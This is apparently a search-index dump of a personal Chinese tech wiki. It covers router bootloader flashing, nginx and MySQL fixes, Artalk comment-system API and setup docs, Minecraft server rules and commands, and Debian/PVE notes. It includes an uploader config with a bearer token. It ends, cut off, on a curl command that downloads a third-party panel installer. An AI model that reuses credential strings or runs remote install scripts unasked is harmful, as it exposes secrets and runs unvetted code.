breed-mt7621-pbr-m1.bin breed.bin 刷入 1mtd write breed.bin Bootloader 重启按住复位键一段时间后访问192.168.1.1，备份编程器固件，多备份几次 nginx反代使用内容替换无法替换js内容 1sub_filter_types *; sub_filter_types指令：sub_filter_types * 用于指定需要被替换的MIME类型,默认为“text/html”，如果制定为*，那么所有的都处理； 来自nginx替换响应内容 - kenwar - 博客园 (cnblogs.com) mysql 将MySQL8.0生成的sql文件，导入MySQL5.7版本时Unknown collation: 'utf8mb4_0900_ai_ci' 使用Navicat进行数据传输，并在选项中设置不包含字符集 Unknown collation: ‘utf8mb4_0900_ai_ci‘ 的解决方案-CSDN博客 Blog 批量替换图片链接为Stellar格式 正则表达式：!\\[(.*?)\\]\\((https:\\/\\/onep\\.hzchu\\.top[^\\?\\)]+)(\\?fmt=avif)?\\) 替换内容：&#123;% image $2$3 download:$2 $1 %&#125; 注意：gallery内部只能填写 md 格式的图片 MCSM 节点无法找到主机java环境 1234nano /etc/systemd/system/mcsm-daemon.service修改Environment字段，添加主机java路径（eg:/opt/jdk/bin）systemctl daemon-reloadsystemctl restart mcsm-daemon Git 报错:error: You have not concluded your merge (MERGE_HEAD exists). $ 无权限写入组织仓库（GitHub） 完成组织权限设置 Snipaste_2024-07-13_08-25-06 新建一个New fine-grained personal access token，Resource owner选择组织，权限处给予contents的读写权限 如果组织权限设置中开启了批准，则需回去在Pending requests里面启用 在本地仓库中运行 $ Upgit 添加lskypro2上传扩展 \\extensions\\lskypro2.jsonc123456789101112131415161718192021222324252627282930313233343536&#123; &quot;meta&quot;: &#123; &quot;id&quot;: &quot;lskypro2&quot;, &quot;name&quot;: &quot;LskyPro2 Uploader&quot;, &quot;type&quot;: &quot;simple-http-uploader&quot;, &quot;version&quot;: &quot;2.0.1&quot;, &quot;repository&quot;: &quot;&quot; &#125;, &quot;http&quot;: &#123; &quot;request&quot;: &#123; &quot;url&quot;: &quot;$(ext_config.host)/api/v1/upload&quot;, &quot;method&quot;: &quot;POST&quot;, &quot;headers&quot;: &#123; &quot;Content-Type&quot;: &quot;multipart/form-data&quot;, &quot;Authorization&quot;: &quot;$(ext_config.token)&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36&quot; &#125;, &quot;body&quot;: &#123; &quot;file&quot;: &#123; &quot;type&quot;: &quot;file&quot;, &quot;value&quot;: &quot;$(task.local_path)&quot; &#125;, &quot;strategy_id&quot;: &#123; &quot;type&quot;: &quot;string&quot;, &quot;value&quot;: &quot;$(ext_config.strategy_id)&quot; &#125; &#125; &#125; &#125;, &quot;upload&quot;: &#123; &quot;rawUrl&quot;: &#123; &quot;from&quot;: &quot;json_response&quot;, &quot;path&quot;: &quot;data.links.url&quot; &#125; &#125;&#125; UPGIT 配置12345678910111213# =============================================================================# UPGIT 配置# =============================================================================# 默认上传器default_uploader = &quot;lskypro2&quot;...[uploaders.lskypro2]host = &quot;https://pic.hzchu.top&quot;token = &quot;Bearer 1|0JWtJ222222222222222222222222222222222MM&quot;strategy_id = &quot;3&quot; Flask 设置的定时任务会重复执行两次函数 原因：在调试模式下（debug），Flask的重新加载器将加载应用程序两次。因此flask总共有两个进程，重新加载器监视文件系统的更改并在不同的进程中启动真实应用程序。 解决办法：禁用重新加载器。在启动flask程序的run语句中，将添加use_reloader=False参数即可禁用重新加载器 关闭调试模式。同样地，在启动flask程序的run语句中，将debug=True改为debug=False即可关闭debug模式，在部署后真实的运行场景中都会关闭调试模式。 1234567if __name__ == &quot;__main__&quot;:启动flask程序 # 直接启动，use_reloader=False禁用重新加载器 app.run(host=&quot;127.0.0.1&quot;, port=5000, debug=True, use_reloader=False) # 只能本机访问 # app.run(host=&quot;0.0.0.0&quot;, port=5000, debug=True, use_reloader=False) # 外网可以访问 # 以命令行方式启动 # manager.run() 原文链接：https://blog.csdn.net/qq_47527477/article/details/122904551 PY hashlib 安装报错： 123ERROR: Ignored the following yanked versions: 20081119ERROR: Could not find a version that satisfies the requirement hashlib (from versions: none)ERROR: No matching distribution found for hashlib 根本不用装"},{"title":"简介","path":"/wiki/study-notes/index.html","content":"前言 每当我想查一些知识点但又不方便翻资料时，上网查能获取的信息总是零零散散，七零八落，几分钟下来给我的幸福指数扣完了。 为了解决这个烦恼，我打算自己整理一些重要内容出来以便有需要时我可以直接参考。 本笔记主要包括 对于常用的知识点的总结 对于学校印发的重要纸质资料的扫描及整理 对于我部分笔记的整理以及修订 一些规范化，模板化的答题思路及答题格式整理 一些我认为有价值的题目 不全？将陆续补充~ 注意本笔记仅供个人使用，因此在部分文段中出现一些意义不明/联系不强的文字时请坐和放宽。如果您有改进建议，欢迎在下方留言。 包括的学科及覆盖内容 语文：答题技巧，答题模板，学校印发的作文素材及部分理解性默写资料 数学：重要的数学概念，好题，答题思路 英语：部分笔记，作文模板/素材，考前复习大纲 物理：重要知识点，好题 化学：易忘知识点，好题 生物：易忘知识点，资料，好题，部分口诀，一些重要概念的解释 题目分级 Level Mean A 没思路或思路与正确思路不符 B 能算，但有点复杂 C 能秒，但有点意思/坑 D 坑人题 其它 试卷库及电子化笔记：Albums - Immich 试卷库及电子化笔记【新】：File Browser"},{"title":"API","path":"/wiki/Artalk-doc/API/index.html","content":"以下所以请求地址均为所搭建的后端地址 eg:https://xxx.com/index.php 还有一些后续补充（例如审核部分），后面会分类 在qwqcode完成规划api后重写 获取页面数据 请求方法:POST 参数名称 参数值 说明 action CommentGet 获取页面数据（必须） page_key page_key 页面唯一ID（必须） limit 请求获取评论数量 offset 请求在xx条评论之后的评论 JSON 回复 根对象： 字段 类型 内容 备注 success str true/false msg str 获取成功/page_key 不能为空 data array 信息本体 data数组： 项 类型 内容 备注 comments obj 评论信息 offset num 请求获取评论数量 与请求保持一致 limit num 请求在xx条评论之后的评论 与请求保持一致 total_parents num 父级评论数量 total num 总评论数量（包括回复他人） admin_nicks obj 管理员昵称 admin_encrypted_emails obj 管理员邮箱（md5加密） page array 该页面评论信息 commentscomments：项类型内容备注idnum该评论唯一idcontentstr评论内容nickstr昵称linkstr链接page_keystrpage_keyridnum所回复评论的id（没有默认为0）uastr浏览器uadatestrYYYY-MD hⓂ️s时间is_collapsedstrtrue/false是否折叠email_encryptedstr邮箱（md5加密）badgeobj“name”: “”, “color”: “”牌子is_adminstrtrue/false是否为管理员 pagecomments：项类型内容备注idnum该页面唯一id(数字)page_keystr页面唯一IDis_close_commentstrtrue/false是否禁用评论 回复评论 请求方法:POST 参数名称 参数值 说明 action CommentAdd 添加评论（必须） content 评论内容（必须） nick 昵称（必须） email 邮箱（必须） link 链接 rid 所回复评论的id（没有默认为0） page_key page_key（必须） password 管理员密码（仅以管理员身份回复时） captcha 验证码（仅触发验证时） JSON 回复 根对象： 字段 类型 内容 备注 success str true/false msg str 评论成功/xxx不能为空/需要验证码 data array 信息本体 data数组： 项 类型 内容 备注 id num 该评论唯一id content str 评论内容 nick str 昵称 link str 链接 page_key str page_key rid num 所回复评论的id（没有默认为0） ua str 浏览器ua date str YYYY-MD hⓂ️s 时间 is_collapsed str true/false 是否折叠 email_encrypted str 邮箱（md5加密） badge obj “name”: “”, “color”: “” 牌子 is_admin str true/false 是否为管理员（仅以管理员身份回复时） data数组(回复&quot;需要验证码&quot;时)： 项 类型 内容 备注 need_captcha str true img_data str data:image… 关闭评论 请求方法:POST 参数名称 参数值 说明 action SetPage 页面设置（必须） nick 昵称（必须） email 邮箱 page_key 页面唯一ID password 管理员密码 is_close_comment 1/0 页面状态，1=&gt;关闭，2=&gt;打开 JSON 回复 根对象： 字段 类型 内容 备注 success str true/false msg str 页面已更新~/需要管理员身份 data array 页面信息 data数组： 项 类型 内容 备注 id num 该页面唯一id（数字） page_key str 该页面唯一id is_close_comment str true/false 是否处于关闭状态 data数组(回复&quot;需要管理员身份&quot;时)： 项 类型 内容 备注 need_password str true/false 通知中心 请求方法:POST 参数名称 参数值 说明 action CommentGetV2 获取通知（必须） nick 昵称（必须） email 邮箱（必须）（如果不填能获取成功但无数据返回） type mentions/all/mine/pending 对应提及/全部/我的/待审（必须） limit 999 默认为999 password 仅以管理员身份时 💢回复与获取页面数据一致 折叠评论 请求方法:POST 参数名称 参数值 说明 action CommentCollapse 评论设置（必须） id 所折叠评论ID nick 昵称（必须） email 邮箱 password 管理员密码 is_collapsed 1/0 页面状态，1=&gt;关闭，2=&gt;打开 JSON 回复 根对象： 字段 类型 内容 备注 success str true/false msg str 评论已(取消)折叠/需要管理员身份 data array 评论信息 data数组： 项 类型 内容 备注 id num 该评论唯一id（数字） is_collapsed str true/false 是否处于折叠状态 data数组(回复&quot;需要管理员身份&quot;时)： 项 类型 内容 备注 need_password str true/false 删除评论 请求方法:POST 参数名称 参数值 说明 action CommentDel 评论删除（必须） id 所删除评论ID nick 昵称（必须） email 邮箱 password 管理员密码 JSON 回复 根对象： 字段 类型 内容 备注 success str true/false msg str 评论已删除/需要管理员身份 data array {“del_total”:1} 检查管理员身份（密码） 请求方法:POST 参数名称 参数值 说明 action AdminCheck 检查管理员密码（必须） nick 昵称（必须） email 邮箱（必须） password 管理员密码 JSON 回复 1&#123;&quot;success&quot;:true,&quot;msg&quot;:&quot;密码正确&quot;,&quot;data&quot;:null&#125;"},{"title":"FAQ","path":"/wiki/Artalk-doc/QandA/index.html","content":"Q:使用Artalk时一直转圈无法加载 A:打开artalk.js，搜索5e3，5e3即5x10³，5000对应5s，把它改为6e4即60s Q:提交评论卡死 A:Issue #6 · ArtalkJS/Artalk (github.com) 如果禁用pcntl_fork()函数会导致无法发信及评论完成页面不刷新 Q:CORS跨域问题？ A:检查配置文件中的博客名称中是否有‘，如果没有就检查下配置文件有没有哪里有问题，如果不是Artalk的问题就去百度 Q:”传送门“跳转到404 A:打开/email-tpl/default.html，在第6行前加上自己的博客链接 （内容待补充）"},{"title":"开发","path":"/wiki/Artalk-doc/develop/index.html","content":"!!! warning 注意 本页面最后编辑时间为2021/7/21，在日后的版本中可能不再适用，请以仓库为准 自定义头像源 官方仓库中是在配置中确定 不过我不想每个页面都多出这么一句话来拖慢速度（虽然微乎其微但可以减少冗余代码🙃） 打开artalk.js,搜索cdn 直接替换就好 自定义表情包 仓库里也有，这里作为补充 !!! warning 注意 由于自定义会使原本引入代码长一大截，建议新建一个js再在需要的地方引入 在new Artalk(&#123;下打个回车， 粘贴emoticons: eData, 在new Artalk(&#123;上粘贴 123let eData = &#123; // ...&#125; 打开表情包配置格式参考，把第一个&#123;和最后一个&#125;中的文字复制到let eData = { }中 然后就是自定义了，在复制后的倒数第二个}后加个,，在，后按回车，按以下格式进行 123456&quot;分类名称&quot;: &#123; &quot;inputType&quot;: &quot;image&quot;, //类型 &quot;container&quot;: &#123; &quot;表情名称&quot;: &quot;表情url/颜文字对应文字&quot;, &#125;&#125; 可以前往 emotion.xiaokang.me 复制现成的 !!! Warning “注意” 在类型一项中，填写emoticon即”颜文字类“，点击插入对应文字填写image即”图片类“，点击插入对应图片表情url中有特殊符号时会无法显示（bug） ~~本站一部分表情用超星学习通作为图床，毕竟又快又不要钱😎~ 以上放屁，有防盗链,建议用去不图床,如果一定要用可以在&lt;head&gt;中加入&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt; 配置完像这样 自定义按钮文字 没什么好说的，打开artalk.js搜索替换就好 按钮点击加载 artalk目前没有懒加载表情，但我们可以通过网页加载好后让访客点击按钮再加载 找到原来放artalk.js的地方，替换为 12345678&lt;script&gt;function load()&#123; var script = document.createElement(&quot;script&quot;); script.type=&quot;text/javascript&quot;; script.src=&#x27;/js/artalkconfig.js&#x27;; //替换为自己的artalk.js链接 document.body.appendChild(script) &#125;&lt;/script&gt; 找个地方放 1&lt;a href=&quot;javascript:load();&quot;&gt;点击加载评论&lt;/a&gt; 自行美化[doge] 未压缩版本 因为原版经过gzipped,导致源码可读性大大降低，这里提供一份未压缩的 蓝奏云"},{"title":"安装（PHP）","path":"/wiki/Artalk-doc/install/index.html","content":"!!! warning 注意 本页面最后编辑时间为2021/7/21，在日后的版本中可能不再适用，请以仓库为准 补全依赖 通过Goorm 先登录 新建容器 仓库地址 完成后在代码框中依次输入 1.安装composer 2.安装php扩展库 3.安装依赖 4.下载到本地 压缩 12cd ../zip -q -r Artalk.zip /workspace/Artalk-API-PHP 注:/workspace/Artalk-API-PHP根据实际修改 再取得ssh连接地址，端口及私钥 然后用wincsp连接上，下载 wsl （如果出现如图问题执行sudo apt-get update) 最后去它的运行目录就可以找到了（上传记得压缩） Github 不与别的文章重复 部署 因为Artalk用php作为后端，所以我们需要找个能运行php的虚拟主机 这里我用的是酷友的御文云 (i.rr.rw) 注册登录购买不必多说 新开通的像这样 点控制台：一键登录跳到文件管理，把原来有的文件删除 上传(完成后点下右上角的刷新) 解压后将文件移动到根目录 （可以删掉workspace和artalk.zip了&gt;_） 修改运行目录为/public 启用PHP 此时在基本功能-域名绑定里可以访问送的二级域名来看看了&gt;_&lt; what?!啊没错，你还要编辑配置文件 站点配置 返回文件管理中编辑Config.example.php 配置 用户名和邮箱很重要~ 保存后重命名为Config.php 前端插入 1234567891011121314151617&lt;div id=&quot;ArtalkComments&quot;&gt;&lt;/div&gt; &lt;!-- ... --&gt; &lt;script src=&quot;https://raw.hzchu.top/ArtalkJS/Artalk/master/dist/Artalk.js&quot;&gt;&lt;/script&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://raw.hzchu.top/ArtalkJS/Artalk/master/dist/Artalk.css&quot;&gt; &lt;script&gt; new Artalk(&#123; el: &#x27;#ArtalkComments&#x27;, // 元素选择 placeholder: &#x27;来啊，快活啊 ( ゜- ゜)&#x27;, // 占位符 noComment: &#x27;快来成为第一个评论的人吧~&#x27;, // 无评论时显示 pageKey: &#x27;[页面唯一标识]&#x27;, serverUrl: &#x27;https://artalk.hzchu.top/&#x27;, //改为刚刚送的二级域名 readMore: &#123; // 阅读更多配置 pageSize: 15, // 每次请求获取评论数 autoLoad: true // 滚动到底部自动加载 &#125; &#125;); &lt;/script&gt; like this"},{"title":"相关链接","path":"/wiki/Artalk-doc/more-url/index.html","content":"镜像源（头像） 极客族 loli cf Workers(自搭) 七牛 您也可以考虑使用Cravatar - 中国的公共头像服务 一些工具 在线JSON校验格式化工具"},{"title":"使用","path":"/wiki/Artalk-doc/use/index.html","content":"管理 当评论区被人灌水时 在评论区的昵称中填入自己刚刚填的用户名和邮箱 在弹出的对话框内输入密码 ( •̀ ω •́ )✧ 设置邮箱提醒 与前面有点重复(^_-) 这里用的是SMTP模式 以qq邮箱为例 登陆qq邮箱（网页版）–设置–账户–POP3/IMAP/SMTP/Exchange/CardDAV/CalDAV服务 开启POP3/SMTP服务,取得授权码 从帮助中心取得smtp服务器相关信息（其它大同小异） 填入配置文件 像这样 有消息来时 自动填写pagekey 第一种（推荐） 将pageKey:' ',改为pageKey: location.pathname, 发出去的请求像这样 ps:如果你的文章题目常常有大量中文可以考虑使用MD5/时间戳/decode(location.pathname) 第二种 将pageKey:' ',改为pageKey: window.location.href, 发出去的请求像这样 PS：因为pagekey有点长，所以可能会一直转圈圈（超过5秒没加载完），参考FAQ"},{"title":"文档","path":"/wiki/Serve-list/docs/index.html","content":"blog.hzchu.top 本站使用Stellar主题，如果你不懂配置而恰巧本站又有你所需要的东西，可以在下方仓库查看 因为我懒得写commit信息，于是便有了这个 commit信息对应表 / A（新增） D（移除） M（修改） E（修订） F（修复） P（页面） AP DP MP EP / F（功能） AF DF MD EF FF 使用“/”分隔，特殊修改另算 cfproxy.hzchu.top 1cfproxy.hzchu.top/&#123;url&#125; 不支持反代带端口号的链接 hightlight-code-api.hzchu.top 可传入参数： 参数名 默认值 解释 code \\ 需要的高亮的代码 url \\ 需要的高亮的代码的链接 lang python 语言 withcss true 是否附带css"},{"title":"标签简介","path":"/wiki/Serve-list/hashtags/index.html","content":"在列表中，我使用了一些标签来标记服务状态，以下是对应描述/标签列表 所在服务器 自有服务对应Thun888’s Server Status，托管于其它平台使用Shields.io生成标签 ​\tTT-hkHome-ikuaiHome-PVEPas-fl 类别 ​\tBase：hzchu.top下基础网络设施，出问题时将导致多处故障 ​\tEdge：边缘服务 若无标签默认Edge 特： ​\tSelf-Coding：自编写 变动 ​\t长期运行废弃停止服务 若无标签默认长期运行 SLA(服务可用性) ​\tH-SLA：高服务可用性 ​\tM-SLA：中等服务可用性 ​\tL-SLA：中等服务可用性，但无可用性保证 若无标签默认M-SLA 高低是相对而言，并不绝对"},{"title":"关于","path":"/wiki/fcloud/about/index.html","content":"简单介绍 这是一个纯生存的公益服，为了更多玩家游玩，我们关闭了正版验证，并使用外置登录。 采用fabric服务端，偏生电 加入了一些实用类插件，在不破坏原版体验下提高玩家体验。 详细版 宣传片 B站宣传片 人员构成 昵称 职务 thun888 腐竹 THEOSMANTHUSWINE 群管理 Yangyyx 群管理 规定（暂行） 1.群内不得刷屏（实在有话讲请把短句变长段，不必挤牙膏） 2.群内不得发送具有色情、挑衅、侮辱性的图片或文章 2.不得在本群宣传其他服务器，不得打广告（谈论其他游戏请不要过度） 3.不得在群里谩骂他人，吵架，请成员及各位管理控制好自己的情绪，以营造一个和谐的聊天环境。 4.游戏时请不要制造高空流水、各种卡/崩服机等会导致卡服、破坏游戏环境的行为 5.游玩时请保持良好的素养，不要做熊孩子！！！ 6.我方提供的所有服务，未经同意禁止用于其他地方 关于封禁制度 我服所禁止的行为包括但不限于： 使用暴力挂，矿透，及规定4内容，一经举报/抽查发现，我们将按照以下规定处罚： 次数 处罚 1 给予警告并强制下线10分钟 2 封禁7天 3&gt;= 永久封禁 以上规定视情节轻重增加或减轻处罚力度。 封禁玩家会在Q群公布 关于绑定制度 内测初期，由于没有使用白名单，我们遇到了2次外挂，2个矿透，还有一个伪装成我吹水的。可见，若不实行强力有效的管理制度，那就毫无游戏体验了。实行一QQ一游戏名绑定制度（白名单）后，至今没有外挂洗礼 ps：外挂视频还在群文档里👻 更新已使用外置登录，但类似 引用及版权声明 网页： ​\t修改自CraftMon 捐赠 至2023-6-23为止，服务器运行已消耗电费100大洋。 不强求，只希望有人给杯可乐解渴 Alipay Wechat 鸣谢 昵称 金额 时间 THEOSMANTHUSWINE 15 2023/07/28 Yangyyx 100 2023/07/28"},{"title":"服务状态通告","path":"/wiki/Serve-list/status/index.html","content":"若空白请刷新网页 状态通告服务变更挖坑"},{"title":"实用命令","path":"/wiki/fcloud/command/index.html","content":"Essential Commands 传送相关 1.玩家间tp /tpa &lt;目标玩家&gt; ：请求传送到xxx玩家 /tpahere &lt;目标玩家&gt;：请求玩家传送到你这儿 /tpaccept &lt;目标玩家&gt;：接受传送请求 /tpdeny &lt;目标玩家&gt;：拒绝传送请求 2.与家相关（/home) /home set &lt;名称&gt;：设置家 /home list：显示所有已保存位置的家 /home tp &lt;名称&gt;：传送至家（注：如果只设置了一个家，可以不写家的名称这个参数） /home delete &lt;名称&gt;：删除家 3./spawn类 与Carpet重复，暂不使用 /spawn set：设置传送点（只能设置一个） /spawn：传送至设置的传送点 4.传送 /back：返回传送前的位置（可用于传送回死亡位置） 其他 /fly 开关飞行模式 /workbench：打开工作台(类似于随身工作台) /enderchest：打开自己的未影箱 /wastebin 打开垃圾桶 HTM（箱子锁） 弃用 检查： /htm flag：运行命令后，敲击箱子检查容器是否公开 设置： /htm set PUBLIC：运行命令后，敲击选择把容器设为公开。 /htm set PRIVATE：运行命令后，敲击选择把容器设为私有，私有状态下只有你授权的玩家可以打开容器。 /htm set KEY：运行命令后，拿着任意物品敲击容器，其他人打开容器时需使用敲击时的物品作为钥匙才能打开容器。 信任和取消信任： /htm trust 玩家名 global：允许玩家打开你的容器。 /htm untrust 玩家名 global：取消玩家打开你容器的权限。 移除保护： /htm remove：移除该容器的保护。 转移权限： /htm transfer 玩家名：把敲击容器的保护权转移给其他玩家，转移后该容器就是别人的了，你将无法打开和破坏该容器。 持续模式： /htm persist：打开或关闭持续模式，打开后输入指令，即可一次敲击多个容器执行这个指令。 Dynmap 详细参阅命令 ·webbukkit/dynmap Wiki (github.com) 隐藏和显示玩家 /dynmap hide：在地图上隐藏自己。 /dynmap show ：在地图上显示自己。 标记 /dmarker add &lt;labelname&gt; icon:&lt;icon&gt; set:&lt;set-id&gt;：在玩家的当前位置添加一个新标记，具有标签名字，（可选）图标，（可选）标记集参数 /dmarker update &lt;label&gt; icon:&lt;newicon&gt; newlabel:&lt;newlabel&gt;：更新与给定标签匹配的第一个标记的图标或标签 /dmarker delete &lt;labelname&gt;：删除标记 /dmarker listsets：列出所有标记 1711180191392.webp Carpet 生物检测 1.检测能否生成生物 1/spawn list &lt;pos&gt; 该命令将检测&lt;pos&gt;所指定的坐标是否能够生成生物，并在聊天栏中输出结果。每一行将显示生物类别、名称、刷怪权重、刷怪尝试次数、能否刷怪、空间是否足够、以及刷怪概率。 1682926112618.webp 2.检查总生物量 1/spawn entities &lt;type&gt; 该命令会检查各类生物的数量以及它们是否达到刷怪上限。 未指定&lt;type&gt;时，将显示每个生物分类的刷怪上限以及已有生物数量。 指定&lt;type&gt;时，将显示该分类下所有占用刷怪上限的生物及其位置。若有权限，点击聊天栏中的坐标会把你传送到那个生物的位置。 &lt;type&gt;可以是ambient（环境生物，即蝙蝠）、axolotls（美西螈）、creature（动物）、misc（其他不占生物上限的生物）、monster（怪物）、underground_water_creature（洞穴水生生物）、water_ambient（水生环境生物，即鱼）、water_creature（水生动物，即海豚和鱿鱼）。 1682926630428.webp 1/spawn mobcaps &lt;dimension&gt; 作用与/spawn entities类似，但可以通过参数&lt;dimension&gt;指定要检查的维度。 1682926663964.webp 速度控制 若不合理使用会被封禁 1/tick warp &lt;ticks&gt; &lt;tail comman&gt; 该命令可以让游戏在&lt;ticks&gt;游戏刻内以最高速度运行，实现跳转到一定时间后的效果。例如，/tick warp 72000 可以让游戏快速运行到1小时之后。 可以在命令末尾添加&lt;tail command&gt;命令，这样carpet会在游戏快速运行结束后执行它。例如，/tick warp 72000 say done 可以让游戏快速运行到1小时之后，随后执行命令/say done。 在游戏加速运行时，不可以重复执行/tick warp命令。但游戏加速运行时执行 /tick warp 或 /tick warp 0 可以停止加速，让游戏恢复正常速度。 1/tick freeze 暂停游戏 1/tick step &lt;ticks&gt; 在游戏暂停时执行此命令，可以使游戏正常运行&lt;ticks&gt;个游戏刻后再次暂停。在游戏正常运行时执行此命令没有效果。 1/tick superHot 该命令会让游戏在玩家移动时运行，在玩家静止时暂停。 1/tick rate &lt;rate&gt; 该指令会直接修改游戏的TPS（每秒游戏刻数），从而调整游戏的速度，默认的TPS为20。 资源监视 1/tick health &lt;ticks&gt; 该指令可以根据执行后一段时间内的游戏运行状况，汇总每游戏刻每个维度中各类东西平均占用的计算时长，包括网络、自动存档、游戏刻外任务、刷怪、区块加载、区块卸载、方块更新、实体运算、方块实体运算、村民与袭击、环境、其他这几项。 默认分析100个游戏刻（5秒）的游戏运行状况，也可以通过&lt;ticks&gt;参数自定义，但不得低于20。 1/tick entities &lt;ticks&gt; 该指令只会汇总执行后一段时间内的游戏内实体和方块实体的运算时长，并列出时长占用最高的10类实体。 默认分析100个游戏刻（5秒）的游戏运行状况，也可以通过&lt;ticks&gt;参数自定义，但不得低于20。 生成假玩家 参阅/player - Carpet - MC百科 该页面引用MC百科 mod有很多命令 ，这里只整理对普通玩家有用的部分"},{"title":"数据安全","path":"/wiki/fcloud/datasafe/index.html","content":"存档 服务器存档本地每天自动备份，每月进行异地备份（遵循321原则）"},{"title":"疑难解答","path":"/wiki/fcloud/faq/index.html","content":"有更多疑问，欢迎反馈 1.无法连接到服务器 ​\teg:未知的主机，连接重置等 ​\tA：由于动态公网的问题，且在连接量过大时可能会被强行下线并更换IP，一般情况下需要5~7min。您可以关注服务器状态。当然，也有可能是服务器出问题，比如6/17号散热风扇故障导致过热停机。 2.在绑定成功后仍显示无白名单（You are not white-listed on this server!） ​\tA：问题在于你的id存在对应的正版用户，或你的正版账号登录出现问题，以离线的方式进入服务器，两者的UUID不相同。 例如在访问http://tools.glowingmines.eu/convertor/nick/lrx时，返回了 1&#123;&quot;nick&quot;:&quot;Lrx&quot;,&quot;uuid&quot;:&quot;b67b9cdfba2740869f53150b96f01a33&quot;,&quot;splitteduuid&quot;:&quot;b67b9cdf-ba27-4086-9f53-150b96f01a33&quot;,&quot;offlineuuid&quot;:&quot;bf2bd774012d3c30a1de15b487ce700e&quot;,&quot;offlinesplitteduuid&quot;:&quot;bf2bd774-012d-3c30-a1de-15b487ce700e&quot;,&quot;haspaid&quot;:&quot;true&quot;&#125; 可以看到同时存在uuid和offlineuuid，默认情况下，白名单会优先使用正版的uuid，从而无法进入游戏。 在群内发送“离线账号修复”可解决 已更改白名单逻辑"},{"title":"插件介绍","path":"/wiki/fcloud/mods/index.html","content":"本篇为实用命令的扩展 以图片为主 内部插件 死亡日志 需搭配客户端mod Image2map 视频： var player = new DogePlayer({ container: document.getElementById('player_1f1693bd319289ed'), userId: 4322, vcode: '1f1693bd319289ed', autoPlay: false, vtype: 10 }); 链接：上传の地方 128*128对应一张地图 请勿使用该服务传播违法消息！ ShowMeWhatYouGot 弃用 1687356500644.webp 1683974941053.webp 显示详情需搭配客户端mod 语音交流 参阅[SVC]简单的语音聊天 (Simple Voice Chat) - MC百科|最大的Minecraft中文MOD百科 (mcmod.cn) 外部插件（MCDR） Beep 格式：@ playername Bot 假人管理 1687358035344.webp QBM 废弃 备份 管理员可使用 1687357994298.webp DayCountNBT 1683974777405.webp QBOT 注意由于腾讯对机器人类项目围堵，且官方机器人接入麻烦，已暂停机器人使用 在Q群中，您可以通过发送关键词来触发机器人 绑定 用于添加白名单 语法：绑定 &lt;playername&gt; 1687358341046.webp 解绑 用于取消白名单 离线账号修复 顾名思义，用于修复无白名单错误 正常流程绑定 用离线账号修复的逻辑替代了绑定，如果出现问题可以试试原版的 ！！上传图片 并不需要关键词，只需要@Bot并带上图片即可，将上传到峰间云海|相册 1689348584454.webp be绑定 同绑定 与be解绑同为管理be端白名单的命令 需在绑定前进行 be解绑 同解绑"},{"title":"更新日志","path":"/wiki/fcloud/upgradelogs/index.html","content":"2024/7/28升级到1.21版本，由于部分mod不兼容/停止更新，弃用mod列表如下：NameReasoncarpet-tctc-addition未跟进1.21版本quickshulker未跟进1.21版本fabrictailor被外置登录替代no-unused-chunks未跟进1.21版本，已停更show-me-what-you-got未跟进1.21版本syncmatica未跟进1.21版本starlight未跟进1.21版本，已停更memoryleakfix未跟进1.21版本lazydfu未跟进1.21版本commandspy未跟进1.21版本anti-xray与1.21存在严重兼容问题未跟进类在日后若支持了会恢复"},{"title":"收藏","path":"/wiki/notes/collect/index.html","content":"文章 chrome://inspect报404解决方案_chrome inspect 404-CSDN博客 DDNS TELEGRAM BOT搭建教程 · wukibaka/ddns-telegram-bot Wiki (github.com) 在fstab文件中配置UUID方式自动挂载数据盘_云服务器 ECS(ECS)-阿里云帮助中心 (aliyun.com) Web 带搜索功能的表格：搞了一个带搜索功能的表格🔥 - 酷小呵 (kuhehe.top) 小米路由器 小米路由器Lua反编译器-小米无线路由器及小米网络设备-恩山无线论坛 (right.com.cn) （有错漏）小米路由固件中lua文件反编译_红米路由器lua解密脚本-CSDN博客 MC 服务器玩家发包过多自动被踢出 - 你问我答 - MC百科社群 - MC百科|最大的Minecraft中文MOD百科 (mcmod.cn) Umami Umami Docker 部署及优化 · 大大的小蜗牛 (eallion.com) Docker 部署 Umami，切换数据库至 PgSQL - ROYWANG WSL WSL 双系统端口映射，网络穿透最新教程_wsl端口映射-CSDN博客 CFW 在Cloudflare Workers里使用markdown-it渲染markdown，并插入HTML中 - MakkaPakka Page Nginx Nginx 跨域设置(CORS)_nginx配置跨域-CSDN博客 工具 百度文库下载 数据库管理：DBeaver"},{"path":"/wiki/notes/linux/index.html","content":"报错类 dpkg 1234dpkg: warning: &#x27;ldconfig&#x27; not found in PATH or not executabledpkg: warning: &#x27;start-stop-daemon&#x27; not found in PATH or not executabledpkg: error: 2 expected programs not found in PATH or not executableNote: root&#x27;s PATH should usually contain /usr/local/sbin, /usr/sbin and /sbin （临时）更新PATH环境变量: 1export PATH=$PATH:/usr/local/sbin:/usr/sbin:/sbin 缺少依赖： 1sudo apt-get install -f -f选项会尝试修复系统上未满足的依赖关系。 PVE 使用本地时间进行RTC: timedatectl set-local-rtc yes 维护 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#换源：https://mirrors.tuna.tsinghua.edu.cn/help/debian/nano /etc/apt/sources.list# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm main contrib non-free non-free-firmware# deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm main contrib non-free non-free-firmwaredeb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-updates main contrib non-free non-free-firmware# deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-updates main contrib non-free non-free-firmwaredeb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-backports main contrib non-free non-free-firmware# deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-backports main contrib non-free non-free-firmware# 以下安全更新软件源包含了官方源与镜像站配置，如有需要可自行修改注释切换deb https://mirrors.tuna.tsinghua.edu.cn/debian-security bookworm-security main contrib non-free non-free-firmware# deb-src https://mirrors.tuna.tsinghua.edu.cn/debian-security bookworm-security main contrib non-free non-free-firmware#安装部分系统工具apt install wget curl unzip sudo -y#给予sudo权限nano /etc/sudoers#安装管理面板HAOZI_DL_URL=&quot;https://dl.cdn.haozi.net/panel&quot;; curl -sSL -O 